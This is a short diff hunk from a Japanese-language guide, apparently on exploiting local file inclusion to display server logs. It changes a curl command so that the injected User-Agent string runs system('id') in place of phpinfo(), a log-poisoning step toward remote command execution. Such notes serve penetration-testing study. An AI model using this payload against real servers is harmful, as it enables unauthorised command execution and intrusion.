@@ -48,7 +48,7 @@ LFIを使ってサーバーのログファイルを画面に表示する
 
 #### PHPコードのサニタイズを確認
 
-`curl http://TARGET -A "<?php phpinfo(); ?>"`
+`curl http://TARGET -A "<?php system('id'); ?>"`
 
 
 
